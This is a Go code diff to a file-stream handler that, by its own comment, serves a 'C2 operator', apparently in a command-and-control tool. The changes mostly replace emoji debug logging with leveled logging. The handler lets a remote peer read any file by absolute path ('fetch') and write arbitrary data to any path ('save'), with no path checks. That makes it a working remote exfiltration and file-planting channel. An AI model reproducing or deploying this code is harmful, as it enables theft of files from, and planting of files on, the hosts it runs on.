@@ -41,11 +41,11 @@ func (fh *FileHandler) HandleFileStream(s network.Stream) {
 	decoder := json.NewDecoder(s)
 	var header FileHeader
 	if err := decoder.Decode(&header); err != nil {
-		logger.Debug("❌ Failed to read file header: %v", err)
+		logger.Error("Failed to read file header: %v", err)
 		return
 	}
 
-	logger.Debug("📂 Received file stream request: %+v", header)
+	logger.Debug("Received file stream request: %+v", header)
 
 	switch header.Cmd {
 	case "fetch":
@@ -54,7 +54,7 @@ func (fh *FileHandler) HandleFileStream(s network.Stream) {
 		// For now, allow absolute paths as the C2 operator runs this.
 		file, err := os.Open(header.Path)
 		if err != nil {
-			logger.Debug("❌ Failed to open file for fetch: %v", err)
+			logger.Error("Failed to open file for fetch: %v", err)
 			// Return error string to stream
 			fmt.Fprintf(s, "ERROR: %v\n", err)
 			return
@@ -67,45 +67,44 @@ func (fh *FileHandler) HandleFileStream(s network.Stream) {
 		// Stream file to the remote node
 		copied, err := io.Copy(s, file)
 		if err != nil {
-			logger.Debug("❌ Error streaming file: %v", err)
+			logger.Error("Error streaming file: %v", err)
 			return
 		}
-		logger.Debug("✅ Streamed %d bytes of %s", copied, header.Path)
+		logger.Info("Streamed %d bytes of %s", copied, header.Path)
 
 	case "save":
 		// Remote node wants to save a file to us (Upload)
 		// the stream contents immediately following the JSON header will be the raw file data
 
 		// Ensure directory exists
-		dir := filepath.Dir(header.Path)
-		if err := os.MkdirAll(dir, 0755); err != nil {
-			logger.Debug("❌ Failed to create directory for save: %v", err)
+		if err := os.MkdirAll(filepath.Dir(header.Path), 0755); err != nil {
+			logger.Error("Failed to create directory for save: %v", err)
 			return
 		}
 
-		file, err := os.Create(header.Path)
+		f, err := os.Create(header.Path)
 		if err != nil {
-			logger.Debug("❌ Failed to create file for save: %v", err)
+			logger.Error("Failed to create file for save: %v", err)
 			return
 		}
-		defer file.Close()
+		defer f.Close()
 
-		copied, err := io.Copy(file, decoder.Buffered())
+		// Read the rest from buffer first
+		copied, err := io.Copy(f, decoder.Buffered())
 		if err != nil {
-			logger.Debug("❌ Error saving file (buffered): %v", err)
-			return
+			logger.Error("Error saving file (buffered): %v", err)
 		}
 
-		copied2, err := io.Copy(file, s)
+		// Then the rest of the stream
+		copied2, err := io.Copy(f, s)
 		if err != nil {
-			logger.Debug("❌ Error saving file (stream): %v", err)
-			return
+			logger.Error("Error saving file (stream): %v", err)
 		}
 
-		logger.Debug("✅ Saved %d bytes to %s", copied+copied2, header.Path)
+		logger.Info("Saved %d bytes to %s", copied+copied2, header.Path)
 
 	default:
-		logger.Debug("❌ Unknown file stream command: %s", header.Cmd)
+		logger.Warn("Unknown file stream command: %s", header.Cmd)
 	}
 }
 
